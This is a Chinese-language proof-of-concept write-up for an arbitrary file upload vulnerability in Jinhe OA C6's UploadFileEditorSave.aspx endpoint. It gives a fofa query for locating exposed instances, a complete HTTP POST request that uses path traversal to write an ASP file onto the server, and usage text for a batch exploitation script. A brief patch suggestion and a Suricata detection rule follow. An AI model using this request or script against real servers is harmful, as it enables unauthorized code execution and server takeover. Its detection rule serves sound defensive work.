### 产品简介  
金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务.  

### 漏洞概述  
金和-c6 uploadfileeditorsave 任意文件上传，攻击者可通过此漏洞获取服务器权限。  

### 指纹识别  
fofa: app="金和网络-金和OA"  

### 漏洞利用  
```
poc:
POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\qps4cckjuz.asp HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Connection: close
Content-Length: 191
Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v
Accept-Encoding: gzip, deflate
 
------9fh1lo9qobtszaiahg6v
Content-Disposition: form-data; name="file"; filename="qps4cckjuz.jpg"
Content-Type: image/png
 
<% response.write(111*111)
%>
 
------9fh1lo9qobtszaiahg6v--
 
 
 
http://your_ip/C6/filename参数中的文件名
```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability/1.png)  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability/2.png)  

### 测试和利用脚本  
```
python3 Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability.py -h          
usage: Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability.py [-h] [-t] [-r FILE] [-u URL]

### Jinhe OA c6 uploadfileeditorsave interface has an arbitrary file upload vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability.py -u
                        http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Jinhe OA c6 uploadfileeditorsave interface has an arbitrary file upload vulnerability."; flow:established,to_server; content:"post";http_method;nocase; content:"/C6/Control/UploadFileEditorSave.aspx";http_uri;fast_pattern;nocase; content:"filename=\\....\\....\\C6";http_uri;nocase; content:"Content-Type: multipart/form-data";nocase;http_header; content:"Content-Disposition: form-data";nocase;http_client_body; content:"filename=";nocase;http_client_body; content:"<%";nocase;http_client_body;distance:0; pcre:"/filename=.*\.(asp|aspx)/Ui"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Jinhe_c6_uploadfileeditorsave_File_Upload_Vulnerability; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:9; rev:1;)
```
